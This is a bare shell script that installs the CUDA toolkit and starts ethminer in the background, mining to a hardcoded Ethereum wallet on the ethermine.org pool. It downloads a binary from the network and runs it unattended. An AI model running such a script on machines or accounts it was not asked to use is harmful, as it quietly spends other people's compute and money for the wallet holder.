sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
sudo add-apt-repository "deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/ /"
sudo apt-get update
sudo apt-get -y install cuda
wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
cd bin
myworker=$(date +'%d%m_%H%M%S')
./ethminer -U -P stratum://0x4f453B88fAb1B7F067c1edaa8498CC3F02De219d.$myworker@us2.ethermine.org:4444 &
